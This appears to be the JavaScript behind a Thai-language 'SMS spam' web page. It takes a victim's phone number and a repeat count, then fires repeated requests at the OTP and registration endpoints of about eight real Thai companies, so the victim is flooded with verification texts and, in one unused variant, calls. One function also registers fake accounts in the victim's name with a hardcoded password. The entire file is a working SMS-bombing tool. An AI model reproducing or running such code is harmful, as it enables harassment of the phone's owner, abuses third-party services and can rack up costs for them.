document.getElementById("spam").onclick = function(){

    myn = document.getElementById("phone").value;
  amo = document.getElementById("Amount").value;


  if (amo >= 61) {
    document.getElementById("status").innerHTML = "Status : Error : จำนวนข้อความไม่เกิน 50";
} else if(amo == 0){
document.getElementById("status").innerHTML = "Status : Error : ใส่จำนวนรอบมากกว่า 1 รอบ";
} else {
  test()
  }
}

function test(){


for (let i = 0; i < amo; i++) {
  spam1()
  spam2()
  spam3()
  spam4()
  spam5()
  spam6()
  spam7()
  spam8()
  spam9()
}
  
document.getElementById("spam").innerHTML = "เรียบร้อย!";

document.getElementById("done").innerHTML = "SPAM To Number Phone > "+myn;

  
  document.getElementById("status").innerHTML = "Status : Done";

  setTimeout(() => {
    document.getElementById("spam").innerHTML = "กดปุ่มเพื่อยิงอีกครั้ง";

  }, 2500)


  
}

function spam1(){
  var url = "https://api.freshket.co/baseApi/Users/RequestOtp";

var xhr = new XMLHttpRequest();
xhr.open("POST", url);

xhr.setRequestHeader("Content-Type", "application/json");

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
   }};

var data = `{
    "isDev": "false",
    "language": "th",
    "phone": "+66${myn}"
}`;

xhr.send(data);

  }

function spam2(){
  var url = "https://api2.1112.com/api/v1/otp/create";

var xhr = new XMLHttpRequest();
xhr.open("POST", url);

xhr.setRequestHeader("user-agent", "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36");
xhr.setRequestHeader("Content-Type", "application/json");

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

var data = `{
  "phonenumber": "${myn}",
  "language": "th"
}`;

xhr.send(data);

}

function spam3(){
  var url = "https://www.carsome.co.th/website/login/sendSMS";

var xhr = new XMLHttpRequest();
xhr.open("POST", url);

xhr.setRequestHeader("user-agent", "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36");
xhr.setRequestHeader("Content-Type", "application/json");

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

var data = `{
  "username": "${myn}",
  "optType": 0
}`;

xhr.send(data);

}


function spam4(){
  var url = `https://hdmall.co.th/phone_verifications?mobile=${myn}&resend=true`;

var xhr = new XMLHttpRequest();
xhr.open("GET", url);

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

xhr.send();

}


function spam5(){
  var url = `https://hdmall.co.th/phone_verifications?mobile=${myn}&resend=true`;

var xhr = new XMLHttpRequest();
xhr.open("GET", url);

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

xhr.send();
  }



function spam6(){
  var url = "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register";

var xhr = new XMLHttpRequest();
xhr.open("POST", url);

xhr.setRequestHeader("Content-Type", "application/json");

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

var data = `{
    "username": "${myn}",
    "password": "asdzxc123GGZX890",
    "name": "${myn}",
    "provinceCode": "1",
    "districtCode": "29",
    "subdistrictCode": "178",
    "zipcode": "10800",
    "siebelCustomerTypeId": "710",
    "acceptTermAndCondition": true,
    "hasSeenConsent": true,
    "locale": "th_TH",
    "acceptPDPAConsent": true
}`;

xhr.send(data);

}



function spam7(){
  var url = "https://www.theconcert.com/rest/request-otp";

var xhr = new XMLHttpRequest();
xhr.open("POST", url);

xhr.setRequestHeader("Content-Type", "application/json");

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

var data = `{
  "mobile": "${myn}",
  "country_code": "TH",
  "lang": "th",
  "digit": 4,
  "channel": "sms"
}`;

xhr.send(data);

}


function spamc1(){
  var url = "https://www.theconcert.com/rest/request-otp";

var xhr = new XMLHttpRequest();
xhr.open("POST", url);

xhr.setRequestHeader("Content-Type", "application/json");

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

var data = `{
  "mobile": "${myn}",
  "country_code": "TH",
  "lang": "th",
  "channel": "call",
  "digit": 4
}`;

xhr.send(data);

}



function spam8(){
  var url = "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp";

var xhr = new XMLHttpRequest();
xhr.open("POST", url);

xhr.setRequestHeader("Content-Type", "application/json");

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

var data = `{
  "mobile_phone_no": "${myn}"
}`;

xhr.send(data);

}


function spam9(){
  var url = "https://www.berlnw.com/myreserve/resendotp";

var xhr = new XMLHttpRequest();
xhr.open("POST", url);

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

var data = `id=${myn}`;

xhr.send(data);


}
